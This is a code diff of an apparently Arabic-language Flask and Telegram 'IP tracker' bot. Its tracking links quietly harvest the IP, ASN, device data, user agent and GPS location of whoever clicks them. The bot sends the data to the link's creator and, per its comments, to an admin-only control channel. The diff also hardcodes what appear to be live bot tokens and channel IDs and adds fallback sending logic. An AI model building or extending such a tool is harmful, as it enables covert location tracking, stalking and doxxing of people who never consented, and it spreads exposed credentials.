@@ -8,11 +8,11 @@ from flask import Flask, request, render_template_string, jsonify
 #  ⚙️  الإعدادات
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-MAIN_BOT_TOKEN    = "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0"
-TRACKER_BOT_TOKEN = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
-TARGET_CHANNEL_ID  = "-1003770774871"   # قناة نتائج التعقب — للمدير فقط
-CONTROL_CHANNEL_ID = "-1003751955886"   # قناة المراقبة — للمدير فقط
-IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")
+MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN",    "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0")
+TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN", "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8")
+TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID",  "-1003770774871")
+CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID", "-1003751955886")
+IPINFO_TOKEN       = os.getenv("IPINFO_TOKEN", "")
 
 app = Flask(__name__)
 
@@ -27,27 +27,38 @@ session_data: dict = {}
 def send_message(chat_id: str, message: str, token: str = None):
     """
     يرسل رسالة عبر Telegram.
-    - للمستخدمين: يستخدم MAIN_BOT_TOKEN (الذي بدأه المستخدم بالفعل)
-    - لقناة المدير: يستخدم TRACKER_BOT_TOKEN (بوت التعقب أدمن في القناة)
+    يجرب TRACKER_BOT_TOKEN أولاً، ثم MAIN_BOT_TOKEN كـ fallback.
     """
-    use_token = token or TRACKER_BOT_TOKEN
-    try:
-        r = requests.post(
-            f"https://api.telegram.org/bot{use_token}/sendMessage",
-            json={
-                "chat_id":                  chat_id,
-                "text":                     message[:4096],
-                "parse_mode":               "Markdown",
-                "disable_web_page_preview": True,
-            },
-            timeout=10,
-        )
-        if r.status_code != 200:
-            print(f"[TRACKER] ⚠️ خطأ إرسال لـ {chat_id}: {r.status_code} — {r.text[:100]}")
-        else:
-            print(f"[TRACKER] ✅ تم الإرسال لـ {chat_id}")
-    except Exception as e:
-        print(f"[TRACKER] ⚠️ استثناء إرسال لـ {chat_id}: {e}")
+    tokens_to_try = []
+    if token:
+        tokens_to_try.append(token)
+    tokens_to_try.append(TRACKER_BOT_TOKEN)
+    tokens_to_try.append(MAIN_BOT_TOKEN)
+
+    seen = set()
+    for use_token in tokens_to_try:
+        if use_token in seen:
+            continue
+        seen.add(use_token)
+        try:
+            r = requests.post(
+                f"https://api.telegram.org/bot{use_token}/sendMessage",
+                json={
+                    "chat_id":                  chat_id,
+                    "text":                     message[:4096],
+                    "parse_mode":               "Markdown",
+                    "disable_web_page_preview": True,
+                },
+                timeout=10,
+            )
+            if r.status_code == 200:
+                print(f"[TRACKER] ✅ تم الإرسال لـ {chat_id}")
+                return
+            else:
+                print(f"[TRACKER] ⚠️ فشل إرسال لـ {chat_id} بـ token={use_token[:10]}...: {r.status_code} — {r.text[:80]}")
+        except Exception as e:
+            print(f"[TRACKER] ⚠️ استثناء إرسال لـ {chat_id}: {e}")
+    print(f"[TRACKER] ❌ فشل جميع المحاولات للإرسال لـ {chat_id}")
 
 
 def get_ip_geo(ip: str) -> dict:
@@ -544,7 +555,7 @@ def _serve_tracker(chat_id: str, session_id: str, page_type: str):
         f"🏛️ ASN       : {asn}\n"
         f"🕐 الوقت    : {timestamp}\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        "✦ راشد — تطوير أبو سعود"
+        "✦ راشد — راشد خليل أبو زيتونه"
     )
     send_message(CONTROL_CHANNEL_ID, quick_notif, token=TRACKER_BOT_TOKEN)
 
@@ -641,7 +652,7 @@ def log_device(chat_id: str, session_id: str):
         "🤖 *[ User Agent ]*\n"
         f"`{d.get('userAgent', 'N/A')[:200]}`\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        "✦ راشد — تطوير أبو سعود"
+        "✦ راشد — راشد خليل أبو زيتونه"
     )
 
     # ✅ يُرسل للمستخدم خاصةً عبر Rashd_IP_Tracker_bot
@@ -673,7 +684,7 @@ def log_gps(chat_id: str, session_id: str):
         f"🕑 التوقيت   : {timestamp}\n"
         f"🗺️ [فتح الخريطة]({maps_link})\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        "✦ راشد — تطوير أبو سعود"
+        "✦ راشد — راشد خليل أبو زيتونه"
     )
 
     # ✅ يُرسل للمستخدم خاصةً عبر Rashd_IP_Tracker_bot
@@ -721,7 +732,7 @@ TRACKER_WELCOME = (
     "ستصلك الآن نتائج سحب IP مباشرةً هنا\n"
     "عندما يضغط أي شخص على رابط التعقب الخاص بك.\n\n"
     "━━━━━━━━━━━━━━━━━━━━━\n"
-    "✦ راشد — تطوير أبو سعود"
+    "✦ راشد — راشد خليل أبو زيتونه"
 )
 
 
